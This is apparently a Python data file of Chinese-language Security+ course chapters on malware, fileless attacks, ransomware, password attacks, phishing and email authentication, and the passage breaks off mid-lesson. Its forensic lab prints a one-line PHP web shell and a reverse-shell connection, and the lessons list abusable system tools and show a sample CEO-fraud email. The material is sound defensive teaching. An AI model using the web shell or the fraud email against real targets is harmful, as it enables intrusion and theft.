# -*- coding: utf-8 -*-
"""路線 4：CompTIA Security+ SY0-701（資安通識）"""

CH = []

CH.append({
    "id": "s01",
    "title": "惡意軟體與攻擊類型全覽",
    "subtitle": "病毒、蠕蟲、木馬、勒索、Rootkit、無檔案攻擊",
    "level": "入門",
    "minutes": 24,
    "summary": "惡意軟體的分類不是為了背名詞，是為了判斷「它怎麼進來、怎麼擴散、怎麼阻止」。",
    "why": "把惡意軟體想成**疾病**：有的靠接觸傳染（病毒需要人執行）、"
           "有的自己會飛（蠕蟲透過網路傳播）、有的假裝是保健食品（木馬）、"
           "有的綁架你要贖金（勒索）。**治療方式取決於傳染途徑**，"
           "所以分類的目的是決定防禦策略。",
    "sections": [
        {
            "heading": "依傳播方式分類",
            "body": "- **病毒 (Virus)**：附著在檔案上，**需要使用者執行**才會啟動與擴散。\n"
                    "- **蠕蟲 (Worm)**：**自己利用網路漏洞傳播，不需要任何人操作**。"
                    "這是它最危險的地方 — WannaCry 靠 SMB 漏洞在幾小時內感染全球。\n"
                    "- **木馬 (Trojan)**：假裝成正常軟體（破解版、假的更新程式），"
                    "使用者自己安裝。**現在最主流的初始入侵手法之一**。\n"
                    "- **邏輯炸彈 (Logic Bomb)**：滿足特定條件才啟動"
                    "（某個日期、某人被刪除帳號時）。常見於離職員工的報復。\n"
                    "- **後門 (Backdoor)**：繞過正常認證的秘密入口。\n"
                    "- **Bot / Botnet**：受控主機組成的殭屍網路，用於 DDoS、挖礦、發垃圾郵件。\n\n"
                    "**依目的分類**：\n"
                    "- **勒索軟體 (Ransomware)**：加密檔案要贖金。"
                    "現在多是**雙重勒索** — 先偷走再加密，你不付錢就公開資料。\n"
                    "- **間諜軟體 (Spyware)** / **鍵盤記錄器 (Keylogger)**：竊取資訊。\n"
                    "- **廣告軟體 (Adware)** / **挖礦程式 (Cryptominer)**：偷資源賺錢。\n"
                    "- **Rootkit**：**隱藏其他惡意軟體的存在**，讓你看不到它。\n"
                    "- **RAT（遠端存取木馬）**：讓攻擊者完整遠端操控。",
            "example": "**同一個防禦措施對不同類型的效果差異**：\n\n"
                       "| 惡意軟體 | 使用者教育 | 及時修補 | 網路分段 | 不可變備份 |\n"
                       "|---|---|---|---|---|\n"
                       "| 病毒（需執行） | **極有效** | 中 | 中 | 中 |\n"
                       "| 蠕蟲（自動傳播） | 幾乎無效 | **極有效** | **極有效** | 中 |\n"
                       "| 木馬（假軟體） | **極有效** | 低 | 中 | 中 |\n"
                       "| 勒索軟體 | 有效 | 有效 | **極有效** | **極有效** |\n\n"
                       "**結論**：\n"
                       "- 對付**蠕蟲**，教育沒用（它不需要人），必須靠**修補 + 分段**。\n"
                       "- 對付**木馬與釣魚**，修補沒用（沒有漏洞被利用），必須靠**教育 + 應用程式白名單**。\n\n"
                       "**這就是為什麼要分類：分類決定你該投資哪個防禦。**",
            "note": "考點區分：**病毒需要宿主檔案 + 使用者執行**；"
                    "**蠕蟲能自我複製並自動透過網路傳播**。"
                    "考試最愛用「在沒有使用者互動的情況下擴散」來暗示答案是蠕蟲。",
        },
        {
            "heading": "現代攻擊的實際樣貌：無檔案與合法工具濫用",
            "body": "**傳統防毒的邏輯**：比對檔案雜湊與特徵碼 → 找到已知的壞檔案。\n\n"
                    "**攻擊者的應對**：\n"
                    "1. **無檔案攻擊 (Fileless)**：完全在記憶體中執行，"
                    "硬碟上沒有可掃描的檔案。透過 PowerShell、WMI、"
                    "註冊表、巨集直接執行。\n"
                    "2. **濫用合法工具 (LOLBins, Living Off The Land)**："
                    "用系統本來就有的工具做壞事。\n"
                    "   - Windows：`powershell.exe`、`certutil.exe`（可下載檔案）、"
                    "`rundll32.exe`、`mshta.exe`、`bitsadmin.exe`、`wmic.exe`\n"
                    "   - Linux：`curl`、`wget`、`bash`、`python`、`nc`\n"
                    "   **這些都是正常工具，防毒不能封鎖它們。**\n"
                    "3. **打包與混淆 (Packing / Obfuscation)**：每次產生的檔案雜湊都不同。\n"
                    "4. **合法簽章濫用**：偷來的程式碼簽章憑證讓惡意程式看起來可信。\n\n"
                    "**所以偵測重心必須從「檔案是什麼」轉向「行為是什麼」** — "
                    "這是 EDR 取代傳統防毒的根本原因。",
            "example": "**一個典型的無檔案攻擊鏈**：\n"
                       "```\n"
                       "1. 使用者收到 Excel 附件，開啟並啟用巨集\n"
                       "2. 巨集執行： powershell -enc <base64編碼的指令>\n"
                       "3. PowerShell 在記憶體中下載並執行第二階段（不落地）\n"
                       "4. 建立 WMI 事件訂閱作為持續化（不是檔案、不是服務、不是 cron）\n"
                       "5. 用系統內建的 net.exe / wmic.exe 探索網域\n"
                       "6. 用竊取的憑證透過 WinRM 橫向移動\n"
                       "```\n\n"
                       "**傳統防毒的偵測機會：接近零**（每一步都是合法工具，沒有惡意檔案）。\n\n"
                       "**EDR 的偵測機會**：\n"
                       "- `EXCEL.EXE → powershell.exe`（**Office 不該生出 PowerShell**）\n"
                       "- PowerShell 使用 `-enc` 編碼參數\n"
                       "- PowerShell 發起對外網路連線\n"
                       "- 建立 WMI 永久事件訂閱\n"
                       "- 短時間內大量網域查詢\n\n"
                       "**每一項單獨看都可能是正常的，組合起來就是明確的攻擊。"
                       "這就是「行為關聯」的價值。**",
            "note": "**LOLBAS 專案**（Living Off The Land Binaries and Scripts）"
                    "整理了所有可被濫用的 Windows 內建程式；Linux 對應的是 GTFOBins。"
                    "防守方應該用它們來建立偵測規則與應用程式管控政策。",
        },
        {
            "heading": "勒索軟體：完整攻擊鏈與每一步的防線",
            "body": "勒索軟體是目前對企業威脅最大的類型，**它的攻擊鏈值得逐步拆解**：\n\n"
                    "1. **初始入侵**：釣魚郵件、暴露的 RDP/VPN、未修補的對外系統、供應鏈\n"
                    "   → 防線：郵件閘道、MFA、修補、關閉不必要的對外服務\n"
                    "2. **執行與駐留**：植入後門並建立持續化\n"
                    "   → 防線：EDR、應用程式白名單、巨集政策\n"
                    "3. **權限提升**：取得本機管理員或網域管理員\n"
                    "   → 防線：最小權限、分層管理、LAPS、PAM\n"
                    "4. **橫向移動**：掃描內網、用竊取的憑證登入其他主機\n"
                    "   → 防線：**網路分段**、停用 SMBv1、限制管理協定來源\n"
                    "5. **資料竊取**：先把資料傳出去（**雙重勒索**）\n"
                    "   → 防線：**出口過濾**、DLP、異常外傳流量偵測\n"
                    "6. **破壞備份**：刪除快照、加密備份伺服器\n"
                    "   → 防線：**不可變備份、離線備份、備份系統獨立驗證**\n"
                    "7. **大規模加密**：通常選在週五深夜或連假\n"
                    "   → 防線：EDR 行為封鎖、誘餌檔案 (Canary Files)\n"
                    "8. **勒索與談判**\n"
                    "   → 防線：事前準備好的事件回應計畫與法律／保險聯絡窗口",
            "example": "**「該不該付贖金」— 這題沒有標準答案，但有明確的考量點**：\n\n"
                       "**不付的理由**：\n"
                       "- 付了不保證能解密（有案例付款後仍拿不到金鑰）\n"
                       "- 資助犯罪，可能違反某些國家的制裁法規\n"
                       "- 付過的組織更容易被再次攻擊\n"
                       "- 資料已被複製，付錢也無法保證不外洩\n\n"
                       "**可能付的情況**：\n"
                       "- 涉及生命安全（醫院系統）\n"
                       "- 備份全毀且無法重建\n"
                       "- 停業成本遠高於贖金\n\n"
                       "**真正的答案是：這個決定應該在被攻擊之前就想好。**\n"
                       "事件當下沒有時間做倫理與法律分析。\n"
                       "所以事件回應計畫裡應該預先寫明：誰有權決定、"
                       "法律顧問是誰、保險條款怎麼規定、"
                       "以及**在什麼情況下我們有信心不付**（= 備份可用）。\n\n"
                       "**而讓你有信心不付的唯一方法，就是有一份攻擊者碰不到的備份。**",
            "note": "台灣的通報義務：關鍵基礎設施與公務機關依《資通安全管理法》"
                    "有法定通報時限；一般企業若涉及個資外洩，"
                    "依《個人資料保護法》有通知當事人的義務。"
                    "**這些時限應該事先寫進事件回應計畫，不是事發才查法規。**",
        },
        {
            "heading": "其他必考的攻擊類型",
            "body": "**密碼攻擊**：\n"
                    "- **暴力破解 (Brute Force)**：逐一嘗試所有組合\n"
                    "- **字典攻擊 (Dictionary)**：用常見密碼清單\n"
                    "- **撞庫 (Credential Stuffing)**：用**別的網站洩漏的帳密**來試你的系統"
                    "（因為大家重複用密碼）\n"
                    "- **密碼噴灑 (Password Spraying)**：用**少數常見密碼**試**大量帳號**"
                    "→ 這樣不會觸發單一帳號的鎖定機制，**比暴力破解更隱蔽**\n"
                    "- **彩虹表 (Rainbow Table)**：預先算好的雜湊對照表 → 對策是 salt\n"
                    "- **傳遞雜湊 (Pass-the-Hash)**：不需要明文密碼，直接用雜湊值認證\n\n"
                    "**其他**：\n"
                    "- **中間人 (MITM / On-path)**：攔在中間竊聽篡改\n"
                    "- **重放攻擊 (Replay)**：錄下合法請求再重送 → 對策是 nonce、時間戳\n"
                    "- **DDoS**：容量型（塞頻寬）vs 應用型（耗資源）vs 放大型（DNS/NTP 反射）\n"
                    "- **零日 (Zero-day)**：無修補可用 → 只能靠分層防禦與偵測\n"
                    "- **供應鏈攻擊**：攻擊你的供應商來攻擊你\n"
                    "- **水坑攻擊 (Watering Hole)**：入侵目標族群常去的網站",
            "example": "**密碼噴灑 vs 暴力破解：為什麼前者更難偵測**\n\n"
                       "**暴力破解**：對 `admin` 帳號試 10000 個密碼\n"
                       "→ 帳號鎖定機制（5 次失敗鎖 30 分鐘）**立刻擋下**，"
                       "且日誌上同一帳號大量失敗**非常明顯**。\n\n"
                       "**密碼噴灑**：對 10000 個帳號各試 3 個常見密碼"
                       "（`Password123`、`Welcome2026`、公司名+年份）\n"
                       "→ 每個帳號只失敗 3 次，**不會觸發鎖定**；\n"
                       "→ 日誌上分散在上萬個帳號，**單看每個帳號都很正常**。\n\n"
                       "**偵測方式必須改變**：不能只看「單一帳號的失敗次數」，"
                       "要看「**單一來源 IP 對多少個不同帳號嘗試登入**」"
                       "以及「**整體失敗率是否異常上升**」。\n\n"
                       "**這是一個重要的通用原則：當攻擊者把行為分散開來，"
                       "偵測邏輯就必須從「縱向（單一實體）」轉為「橫向（跨實體聚合）」。**",
            "note": "考點高頻陷阱：\n"
                    "- **撞庫**用的是「其他網站洩漏的真實帳密組合」\n"
                    "- **密碼噴灑**用的是「少量常見密碼 × 大量帳號」\n"
                    "- **暴力破解**用的是「大量密碼 × 少量帳號」\n"
                    "三者常在同一題出現當干擾選項。",
        },
    ],
    "table": {
        "caption": "惡意軟體類型速查",
        "head": ["類型", "需要使用者操作", "自我傳播", "主要目的", "關鍵防禦"],
        "rows": [
            ["病毒 Virus", "是", "需附著檔案", "破壞、傳播", "防毒、教育、應用白名單"],
            ["蠕蟲 Worm", "否", "是（網路漏洞）", "快速擴散", "及時修補、網路分段"],
            ["木馬 Trojan", "是", "否", "取得存取權", "教育、軟體來源管控"],
            ["勒索 Ransomware", "多為是", "部分會", "金錢", "不可變備份、分段、EDR"],
            ["Rootkit", "視情況", "否", "隱藏自身與他者", "完整性監控、安全開機"],
            ["RAT", "是", "否", "遠端完整操控", "EDR、出口過濾"],
            ["Bot / Botnet", "是", "部分", "DDoS、挖礦、垃圾信", "出口過濾、DNS 過濾"],
            ["無檔案 Fileless", "多為是", "否", "規避偵測", "EDR 行為偵測、腳本管控"],
            ["邏輯炸彈", "否（條件觸發）", "否", "破壞、報復", "程式碼審查、職務分離"],
        ],
    },
    "labs": [{
        "title": "惡意程式的行為特徵檢查",
        "goal": "用系統工具找出「行為像惡意軟體」的東西，不依賴防毒特徵碼。",
        "warn": "全部是查詢指令。**請勿下載或執行任何真實惡意樣本**；若要研究樣本必須在完全隔離的沙箱中進行。",
        "steps": [
            {"cmd": "ps -eo user,pid,ppid,%cpu,etime,comm --sort=-%cpu | head -8",
             "explain": "**挖礦程式的特徵**：CPU 極高 + 執行時間長 + 服務帳號擁有。",
             "output": "USER       PID  PPID %CPU     ELAPSED COMMAND\nwww-data  4472   813 98.7    02:14:07 kworker/0:2\nwww-data  4488   813 45.2    02:11:44 .sysd\nroot       812     1  0.1  3-04:22:11 nginx\nroot       744     1  0.0  3-04:22:15 sshd\nroot         1     0  0.0  3-04:22:20 systemd\n# 前兩個由 nginx(813) 生出、屬 www-data、CPU 極高且已跑兩小時 → 挖礦"},
            {"cmd": "sudo lsof -i -P -n | grep -E 'ESTABLISHED|LISTEN' | grep -v -E 'sshd|nginx|systemd-resolve'",
             "explain": "**排除已知正常服務後**，剩下的網路活動就是需要解釋的部分。"
                        "這是很有效的降噪技巧。",
             "output": "kdevtmpf 4472 www-data 3u IPv4 0x8f21 0t0 TCP 10.10.10.5:51501->185.220.101.44:9001 (ESTABLISHED)\n.sysd    4488 www-data 3u IPv4 0x8f44 0t0 TCP 10.10.10.5:51533->185.220.101.44:4444 (ESTABLISHED)\n# 兩條連往同一外部 IP：9001（礦池）與 4444（反向 shell）"},
            {"cmd": "sudo find / -newermt '2 hours ago' -type f \\( -perm -u+x -o -name '*.sh' \\) 2>/dev/null | grep -vE '^/(proc|sys|run)' | head -10",
             "explain": "**找出最近兩小時新增的可執行檔或腳本**。"
                        "入侵後一定會落地新檔案（除非是純無檔案攻擊）。",
             "output": "/tmp/.kdevtmpfsi\n/tmp/.sysd\n/var/www/html/uploads/shell.php\n/etc/systemd/system/system-update.service\n# 第三個在網站上傳目錄 → 找到初始入侵點：檔案上傳漏洞"},
            {"cmd": "sha256sum /tmp/.kdevtmpfsi",
             "explain": "**取證第一步**：計算雜湊。用它去 VirusTotal 或威脅情報平台查詢，"
                        "並記錄在事件報告中。",
             "output": "8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4  /tmp/.kdevtmpfsi"},
            {"cmd": "sudo grep -rE '(eval|base64_decode|system|exec|shell_exec|passthru)\\s*\\(' /var/www/html --include='*.php' -l | head -5",
             "explain": "**找 Web Shell**：PHP 後門幾乎都會用到這幾個危險函式。",
             "output": "/var/www/html/uploads/shell.php\n/var/www/html/wp-content/themes/twentytwenty/.cache.php\n# 第二個藏在主題目錄且以 . 開頭 → 更隱蔽的後門"},
            {"cmd": "sudo head -c 300 /var/www/html/uploads/shell.php",
             "explain": "看後門內容（**只看前段，不執行**）。這是典型的一行式 Web Shell。",
             "output": "<?php @eval($_POST['x']); ?>\n# 極簡 Web Shell：攻擊者 POST 任意 PHP 程式碼即可執行\n# 對應防禦：上傳目錄設 noexec、禁止執行 PHP、檢查副檔名與內容型別"},
            {"cmd": "sudo grep -E 'shell\\.php' /var/log/nginx/access.log | head -3",
             "explain": "**從 Web 日誌重建入侵時間軸**：誰、什麼時候、上傳並使用了後門。",
             "output": "203.0.113.9 - - [30/Jul/2026:10:31:02 +0800] \"POST /upload.php HTTP/1.1\" 200 412 \"-\" \"python-requests/2.31.0\"\n203.0.113.9 - - [30/Jul/2026:10:33:18 +0800] \"POST /uploads/shell.php HTTP/1.1\" 200 88 \"-\" \"python-requests/2.31.0\"\n203.0.113.9 - - [30/Jul/2026:10:38:20 +0800] \"POST /uploads/shell.php HTTP/1.1\" 200 1204 \"-\" \"python-requests/2.31.0\"\n# User-Agent 是 python-requests = 自動化工具，非正常瀏覽器\n# 完整鏈：10:31 上傳 → 10:33 測試 → 10:38 植入挖礦程式"},
        ],
    }],
    "quiz": [
        {"q": "某惡意程式在沒有任何使用者操作的情況下，透過網路漏洞感染了同網段的 200 台主機。這屬於？",
         "options": ["病毒", "蠕蟲", "木馬", "邏輯炸彈"],
         "answer": 1,
         "why": "自我複製 + 自動透過網路傳播 = 蠕蟲。"
                "考試常用「無使用者互動」來暗示答案。防禦重心是修補與網路分段，教育無效。"},
        {"q": "攻擊者用 `certutil.exe` 下載惡意檔案、用 `powershell.exe` 在記憶體中執行。這種手法叫什麼？",
         "options": ["零日攻擊", "濫用合法工具 (Living Off The Land / LOLBins)",
                     "供應鏈攻擊", "重放攻擊"],
         "answer": 1,
         "why": "使用系統內建的合法程式，防毒無法封鎖。偵測必須改看行為鏈"
                "（例如 Office 生出 PowerShell）。參考 LOLBAS 與 GTFOBins。"},
        {"q": "用少數常見密碼去嘗試大量不同帳號，避免觸發帳號鎖定。這叫？",
         "options": ["暴力破解", "撞庫 Credential Stuffing", "密碼噴灑 Password Spraying", "彩虹表攻擊"],
         "answer": 2,
         "why": "Password Spraying：少量密碼 × 大量帳號。偵測要看「單一來源對多少不同帳號嘗試」，"
                "而非單一帳號的失敗次數。"},
        {"q": "「撞庫 (Credential Stuffing)」使用的是什麼？",
         "options": ["隨機產生的密碼", "其他網站洩漏的真實帳號密碼組合",
                     "預先計算的雜湊表", "系統預設密碼"],
         "answer": 1,
         "why": "因為使用者跨網站重複使用密碼，A 網站洩漏就能登入 B 網站。"
                "對策是 MFA 與檢查密碼是否出現在已知洩漏清單。"},
        {"q": "勒索軟體攻擊鏈中，哪一項防禦最能確保「不必付贖金」？",
         "options": ["更好的防毒軟體", "不可變備份或離線備份，讓攻擊者無法破壞備份",
                     "更長的密碼", "關閉所有 USB"],
         "answer": 1,
         "why": "攻擊者的最後一步通常是刪除備份。有一份他碰不到的備份，是不付錢的唯一保證。"},
        {"q": "現代勒索軟體採用「雙重勒索」，指的是？",
         "options": ["加密兩次", "先竊取資料再加密，不付錢就公開外洩",
                     "同時攻擊兩家公司", "要求兩次付款"],
         "answer": 1,
         "why": "這使得「有備份就不用付錢」不再完全成立 — 資料外洩的風險仍在。"
                "因此出口過濾與 DLP 也是勒索防禦的一部分。"},
        {"q": "Rootkit 的主要功能是？",
         "options": ["加密檔案", "隱藏惡意軟體與攻擊者活動的存在，讓系統工具回報造假結果",
                     "竊取密碼", "發動 DDoS"],
         "answer": 1,
         "why": "它替換或掛鉤系統工具（ps、ls、netstat）。"
                "因此在被入侵的主機上執行它自己的指令是不可靠的。"},
        {"q": "為什麼「及時修補」對蠕蟲極有效，但對木馬幾乎無效？",
         "options": ["蠕蟲比較弱", "蠕蟲利用軟體漏洞傳播；木馬是使用者自願安裝，沒有漏洞被利用",
                     "木馬不需要網路", "修補只針對網路服務"],
         "answer": 1,
         "why": "防禦措施必須對應傳播機制。木馬要靠使用者教育、軟體來源管控與應用程式白名單。"},
        {"q": "重放攻擊 (Replay Attack) 的對策是？",
         "options": ["更長的密碼", "使用一次性隨機值 (nonce)、時間戳或序號，讓舊請求無法重複使用",
                     "關閉日誌", "使用 UDP"],
         "answer": 1,
         "why": "重放攻擊錄下合法請求再重送。加入不可重複使用的元素即可失效。"
                "TLS 與 Kerberos 都內建此機制。"},
        {"q": "為什麼 EDR 能偵測到傳統防毒抓不到的攻擊？",
         "options": ["EDR 的特徵碼更多", "EDR 偵測行為與程序關聯鏈，而非依賴檔案雜湊或特徵碼",
                     "EDR 掃描速度更快", "EDR 會封鎖所有程式"],
         "answer": 1,
         "why": "無檔案攻擊與 LOLBins 沒有惡意檔案可掃。"
                "但「Word 生出 PowerShell 並對外連線」這個行為鏈是可偵測的。"},
    ],
    "keywords": ["病毒", "蠕蟲", "木馬", "勒索軟體", "Rootkit", "RAT", "Botnet",
                 "無檔案攻擊", "LOLBins", "LOLBAS", "雙重勒索", "撞庫", "密碼噴灑",
                 "傳遞雜湊", "重放攻擊", "水坑攻擊", "EDR", "Web Shell"],
    "takeaway": [
        "分類的目的是決定防禦：蠕蟲靠修補與分段、木馬靠教育與白名單。",
        "現代攻擊多為無檔案與合法工具濫用，偵測必須從「檔案是什麼」轉向「行為是什麼」。",
        "不可變備份是「不必付贖金」的唯一保證；但雙重勒索讓出口過濾與 DLP 同樣必要。",
    ],
})

CH.append({
    "id": "s02",
    "title": "社交工程：攻擊人比攻擊機器容易",
    "subtitle": "釣魚、BEC、六大心理原則、防禦與演練",
    "level": "入門",
    "minutes": 22,
    "summary": "超過八成的資安事件從一封信或一通電話開始。技術可以修補，人不能打補丁 — 只能訓練與設計流程。",
    "why": "**駭客不必破解你的密碼，只要說服你告訴他。**"
           "這就像小偷不撬鎖，而是穿制服說「我是水電工」讓你開門。"
           "社交工程之所以有效，是因為它利用的不是漏洞，"
           "而是**人的正常心理反應** — 想幫忙、怕權威、怕錯過。",
    "sections": [
        {
            "heading": "六大心理原則（攻擊者的武器）",
            "body": "所有社交工程都是這六個原則的組合：\n\n"
                    "1. **權威 (Authority)**：「我是總經理」「這是 IT 部門的要求」\n"
                    "2. **急迫 (Urgency)**：「三十分鐘內必須完成」「帳號即將停用」\n"
                    "3. **稀少 (Scarcity)**：「只剩兩個名額」「限時優惠」\n"
                    "4. **喜好 (Liking)**：先閒聊建立好感，或假冒認識的人\n"
                    "5. **從眾 (Social Proof / Consensus)**：「其他同事都已經完成了」\n"
                    "6. **互惠 (Reciprocity)**：先給小恩惠（免費禮物、幫個小忙）再提出要求\n\n"
                    "**最有效的組合是「權威 + 急迫」** — "
                    "它同時讓你不敢質疑（權威）也沒時間思考（急迫）。\n\n"
                    "**這也給出了最有效的防禦：**\n"
                    "> **凡是「權威 + 急迫 + 要求繞過流程」同時出現，就是攻擊。**\n\n"
                    "把這句話變成公司政策，比任何技術產品都有效。",
            "example": "**一封真實樣態的 BEC（商業郵件詐騙）信件**：\n\n"
                       "```\n"
                       "寄件者：陳大明 <ceo.chen@company-tw.com>   ← 網域少一個字\n"
                       "主旨：【急】機密併購案付款\n"
                       "\n"
                       "小美：\n"
                       "\n"
                       "我現在在國外開會不方便講電話（急迫 + 阻斷驗證）。\n"
                       "我們正在進行一個機密併購案，法務要求今天下班前\n"
                       "必須匯出定金 NT$2,800,000 到以下帳戶。\n"
                       "\n"
                       "這件事目前只有我和你知道，請不要跟其他人討論\n"
                       "（阻斷正常流程 + 製造特殊信任）。\n"
                       "\n"
                       "完成後直接回覆我這封信。\n"
                       "\n"
                       "陳大明\n"
                       "總經理\n"
                       "```\n\n"
                       "**六個危險訊號**：\n"
                       "1. 寄件網域與公司網域**相似但不同**\n"
                       "2. 主動說明「不方便電話聯絡」→ **刻意阻斷你去驗證**\n"
                       "3. 極度急迫（今天下班前）\n"
                       "4. 要求保密 → **阻斷正常的多人審核**\n"
                       "5. 要求匯到新的、未經建檔的帳戶\n"
                       "6. 繞過既有的付款流程\n\n"
                       "**唯一有效的防禦不是「員工要更聰明」，而是流程：**\n"
                       "> **任何變更付款帳戶或超過門檻的匯款，"
                       "必須透過「另一個既有的通訊管道」向本人回撥確認。**\n"
                       "而且「回撥」必須用**電話簿裡原本的號碼**，"
                       "不是信裡提供的號碼。",
            "note": "BEC 的財務損失通常遠高於勒索軟體，"
                    "但因為不涉及惡意程式，技術防禦幾乎無效。"
                    "**這是「流程控制勝過技術控制」最典型的例子。**",
        },
        {
            "heading": "釣魚的各種變體",
            "body": "- **釣魚 (Phishing)**：大量寄送的通用假信\n"
                    "- **魚叉式釣魚 (Spear Phishing)**：針對特定個人客製化，"
                    "會提到你的職稱、專案、同事名字（資料來自 LinkedIn、公司網站）\n"
                    "- **捕鯨 (Whaling)**：專門針對高層主管\n"
                    "- **BEC / CEO 詐騙**：冒充高層要求匯款或提供資料\n"
                    "- **語音釣魚 (Vishing)**：電話詐騙，常冒充 IT 支援或銀行\n"
                    "- **簡訊釣魚 (Smishing)**：假的簡訊連結（**台灣極常見**）\n"
                    "- **QR Code 釣魚 (Quishing)**：把惡意網址藏在 QR Code 裡，"
                    "**繞過郵件的連結掃描機制**\n"
                    "- **搜尋引擎釣魚**：買廣告讓假網站出現在搜尋結果最上方\n"
                    "- **MFA 疲勞 / 推播轟炸**：狂發驗證通知直到你按同意\n"
                    "- **中間人釣魚 (AiTM)**：即時代理真實登入頁面，"
                    "**連 TOTP 驗證碼與 session cookie 都能偷走**\n\n"
                    "**實體社交工程**：\n"
                    "- **尾隨 (Tailgating)**：跟在有卡的人後面進門\n"
                    "- **假冒 (Impersonation)**：穿制服假裝維修人員\n"
                    "- **翻垃圾 (Dumpster Diving)**：從丟棄文件找資訊\n"
                    "- **肩窺 (Shoulder Surfing)**：偷看螢幕或鍵盤\n"
                    "- **USB 誘餌 (Baiting)**：故意丟隨身碟在停車場",
            "example": "**為什麼 AiTM 釣魚讓「有 MFA 就安全」不再成立**：\n\n"
                       "傳統釣魚：假網站收集帳密 → 但有 MFA 就進不去。\n\n"
                       "**AiTM（Adversary-in-the-Middle）**：\n"
                       "```\n"
                       "你 → [攻擊者的代理伺服器] → 真正的登入頁面\n"
                       "```\n"
                       "1. 你在假網站輸入帳密 → 攻擊者**即時轉送**到真網站\n"
                       "2. 真網站要求 MFA → 攻擊者把要求**轉給你**\n"
                       "3. 你輸入 TOTP → 攻擊者**即時轉送**\n"
                       "4. 真網站發出 **session cookie** → **攻擊者攔截並保存**\n"
                       "5. 攻擊者用這個 cookie 直接登入，**完全不需要再過 MFA**\n\n"
                       "**你看到的一切都正常**：正確的公司登入頁（因為是代理的真頁面）、"
                       "MFA 有動作、最後成功登入。\n\n"
                       "**唯一能防的技術**：**FIDO2 / Passkey**。"
                       "因為它的簽章**綁定網域**（origin binding）— "
                       "假網域根本產生不出有效的簽章，攻擊者連轉送都做不到。\n\n"
                       "**這就是為什麼 FIDO2 被稱為唯一能真正防釣魚的驗證方式。**",
            "note": "考點：Vishing = 語音、Smishing = 簡訊、Quishing = QR Code、"
                    "Whaling = 針對高層、Pharming = 透過 DNS 毒化把你導向假站"
                    "（**不需要你點連結**，這是它與釣魚的關鍵區別）。",
        },
        {
            "heading": "技術面的釣魚防禦：郵件三劍客",
            "body": "**SPF、DKIM、DMARC** 是防止「別人冒用你的網域寄信」的三層機制。"
                    "**這三個一定要會，考試與實務都必問。**\n\n"
                    "**1. SPF（Sender Policy Framework）**\n"
                    "- 在 DNS 記錄「哪些 IP 有資格用我的網域寄信」\n"
                    "- 收信端檢查來源 IP 是否在清單內\n"
                    "- 例：`v=spf1 include:_spf.google.com -all`（`-all` = 其他一律拒絕）\n"
                    "- **弱點**：轉寄 (forwarding) 會讓 SPF 失敗\n\n"
                    "**2. DKIM（DomainKeys Identified Mail）**\n"
                    "- 寄信端用**私鑰對郵件簽章**，公鑰放在 DNS\n"
                    "- 收信端驗證簽章 → 確認郵件**未被篡改**且真的來自該網域\n"
                    "- **優點**：轉寄後仍有效\n\n"
                    "**3. DMARC**\n"
                    "- **告訴收信端：SPF/DKIM 失敗時該怎麼做**\n"
                    "- `p=none` 只觀察並回報 → `p=quarantine` 丟垃圾桶 → "
                    "`p=reject` **直接拒收**\n"
                    "- 還提供**報告機制**，讓你知道有誰在冒用你的網域\n"
                    "- 例：`v=DMARC1; p=reject; rua=mailto:dmarc@company.com; pct=100`\n\n"
                    "**關鍵**：只設 SPF/DKIM **不夠**，"
                    "因為沒有 DMARC 的話收信端不知道該怎麼處理失敗的信。",
            "example": "**DMARC 導入的正確步驟**（直接上 `p=reject` 會擋掉自己的信）：\n\n"
                       "```\n"
                       "第 1 個月： v=DMARC1; p=none; rua=mailto:dmarc@corp.com\n"
                       "  → 只收報告，不影響任何郵件。目的是找出「有哪些系統在用我的網域寄信」\n"
                       "     （常會發現：行銷平台、ERP、監控系統、印表機…全都沒設 SPF）\n"
                       "\n"
                       "第 2-3 個月：把找到的合法寄件來源全部加進 SPF 與 DKIM\n"
                       "\n"
                       "第 4 個月： v=DMARC1; p=quarantine; pct=25; rua=...\n"
                       "  → 只對 25% 的失敗郵件隔離，觀察有沒有誤擋\n"
                       "\n"
                       "第 5 個月： p=quarantine; pct=100\n"
                       "\n"
                       "第 6 個月： v=DMARC1; p=reject; pct=100; rua=...\n"
                       "  → 完成。此時別人冒用你的網域寄信會被直接拒收\n"
                       "```\n\n"
                       "**注意 DMARC 的限制**：它只保護「**完全相同**的網域」。"
                       "攻擊者用 `company-tw.com`（相似網域）寄信，DMARC 完全擋不到 — "
                       "因為那是他自己的網域，他可以設定完美的 SPF/DKIM。\n\n"
                       "**所以還需要**：\n"
                       "- 相似網域監控（把常見錯拼的網域自己註冊下來）\n"
                       "- 郵件閘道的「顯示名稱與網域不符」偵測\n"
                       "- **外部寄件者橫幅**（在信件最上方加上「⚠ 此信來自外部」）",
            "note": "**外部寄件橫幅是投報率極高的低成本措施。**"
                    "它讓「冒充內部同事」的攻擊在使用者眼前立刻現形，"
                    "而且不需要使用者記住任何規則。",
        },
        {
            "heading": "人員面的防禦：訓練與演練",
            "body": "**無效的訓練**（很常見但沒用）：\n"
                    "- 一年一次的長篇簡報\n"
                    "- 只講「不要點可疑連結」（**沒有人覺得自己點的是可疑連結**）\n"
                    "- 對答錯的人公開責罵 → 結果是**下次中招沒人敢通報**\n\n"
                    "**有效的訓練**：\n"
                    "1. **短、頻繁、具體**：每月 5 分鐘，用**真實發生在本公司的案例**\n"
                    "2. **教「怎麼驗證」而非「怎麼識別」**：\n"
                    "   識別很難（假信越來越像），但**驗證流程很簡單**：\n"
                    "   「用另一個管道向本人確認」永遠有效。\n"
                    "3. **釣魚演練 + 立即回饋**：點了就跳出教學頁面，"
                    "說明「這封信的三個線索在哪」\n"
                    "4. **獎勵通報，不懲罰中招**：\n"
                    "   **最重要的指標不是「點擊率」，是「通報率」。**\n"
                    "   一個願意在點下去後立刻通報的員工，比從不點擊但不通報的員工更有價值 — "
                    "因為前者讓你有機會在五分鐘內處理，後者讓你什麼都不知道。\n"
                    "5. **針對高風險族群加強**：財務、人資、高層助理、IT 管理員",
            "example": "**釣魚演練的正確指標設計**：\n\n"
                       "**錯誤的做法**：只看點擊率，並把點擊率當 KPI 逼部門降低。\n"
                       "→ 副作用：員工學會「什麼都不點」，包含真正的公司通知；"
                       "或部門主管私下警告大家「這週有演練」。\n\n"
                       "**正確的指標組合**：\n"
                       "```\n"
                       "點擊率        目標下降，但不是唯一指標\n"
                       "資料輸入率    比點擊率更重要（點連結 vs 真的輸入帳密）\n"
                       "通報率        目標上升 ← 最重要\n"
                       "平均通報時間  目標縮短（從幾小時到幾分鐘）\n"
                       "重複中招率    找出需要一對一輔導的對象\n"
                       "```\n\n"
